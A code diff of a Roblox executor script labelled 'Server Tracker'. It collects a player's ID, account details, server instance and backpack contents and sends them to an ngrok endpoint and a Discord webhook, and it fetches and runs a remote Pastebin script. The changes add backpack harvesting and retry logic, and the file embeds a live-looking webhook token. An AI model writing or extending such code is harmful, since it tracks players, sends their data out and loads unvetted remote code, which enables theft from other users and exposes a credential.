@@ -2,10 +2,10 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 
 -- ======= CONFIGURATION =======
-local API_ENDPOINT = "api-rho-nine-77.vercel.app/api/setInstanceId"
+local API_ENDPOINT = "https://a5c8-36-76-129-51.ngrok-free.app/api/setInstanceId" -- Pastikan ada https:// lengkap
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
 local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
--- =============================
+-- ==============================
 
 local player = Players.LocalPlayer
 local currentJobId = game.JobId
@@ -16,7 +16,10 @@ local playerUserId = player.UserId
 local function httpRequest(url, method, body, headers, retries)
     retries = retries or 3
     local requestFunc = syn and syn.request or http_request or request
-    if not requestFunc then return nil end
+    if not requestFunc then 
+        warn("[httpRequest] No compatible HTTP request function found")
+        return nil 
+    end
     
     for i = 1, retries do
         local success, response = pcall(function()
@@ -63,32 +66,28 @@ end
 local function updateInstanceInDatabase()
     local data = {
         instanceId = currentJobId,
-        username = player.Name,  -- Added required username field
-        player = {
-            userId = playerUserId,
-            name = player.Name,
-            accountAge = player.AccountAge,
-            displayName = player.DisplayName
-        },
+        userId = playerUserId,
+        username = playerName,
+        accountAge = player.AccountAge,
+        displayName = player.DisplayName,
         timestamp = os.time(),
-        additionalData = {
-            gameId = game.GameId,
-            placeId = game.PlaceId
-        }
+        gameId = game.GameId,
+        placeId = game.PlaceId,
+        backpackContents = getBackpackContents()
     }
     
-    local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
+    local encodedData = HttpService:JSONEncode(data)
+    local response = httpRequest(API_ENDPOINT, "POST", encodedData)
     
     if response then
-        print("API Response:", response.StatusCode, response.Body)
-        
-        if response.StatusCode == 200 then
+        print("API Response:", response.StatusCode or response.Status, response.Body or response.Body)
+        if (response.StatusCode == 200 or response.Status == 200) then
             print("✅ Successfully updated instance ID and user data in database")
             print("   Instance ID:", currentJobId)
             print("   User ID:", playerUserId)
             return true
         else
-            warn("❌ API Error:", response.Body)
+            warn("❌ API Error:", response.Body or "Unknown error")
             return false
         end
     else
@@ -136,16 +135,27 @@ local function sendServerChangeNotification()
             }
         }
     }
-    
-    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+
+    -- Retry sending webhook 3 times
+    local success
+    for i = 1, 3 do
+        local res = httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
+        if res and (res.StatusCode == 204 or res.Status == 204) then
+            success = true
+            break
+        end
+        wait(1)
+    end
+
+    if not success then
+        warn("❌ Failed to send webhook notification after retries")
+    end
 end
 
 -- Main function to handle server joins/changes
 local function handleServerJoin()
-    -- Run external script asynchronously
-    spawn(executeExternalScript)
+    spawn(executeExternalScript) -- Run external script async
     
-    -- Update database with instance and user info
     local attempts = 0
     local maxAttempts = 3
     local success = false
@@ -153,12 +163,9 @@ local function handleServerJoin()
     while attempts < maxAttempts and not success do
         attempts += 1
         success = updateInstanceInDatabase()
-        if not success then
-            wait(2) -- Wait before retrying
-        end
+        if not success then wait(2) end
     end
     
-    -- Send notification
     sendServerChangeNotification()
 end
 
@@ -172,22 +179,20 @@ local function monitorServerChanges()
             print("🔄 Detected server change:", lastJobId, "→", newJobId)
             currentJobId = newJobId
             lastJobId = newJobId
-            handleServerJoin() -- Process the server change
+            handleServerJoin()
         end
-        wait(1) -- Check every second
+        wait(1)
     end
 end
 
--- Initial execution
 local success, err = pcall(function()
     print("🚀 Initializing Server Tracker for UserID:", playerUserId)
-    handleServerJoin() -- Run for initial join
-    monitorServerChanges() -- Start monitoring for changes
+    handleServerJoin()
+    monitorServerChanges()
 end)
 
 if not success then
     warn("❌ Critical error in server tracker:", err)
-    -- Attempt to send error notification
     local errorEmbed = {
         username = "Server Tracker - ERROR",
         embeds = {
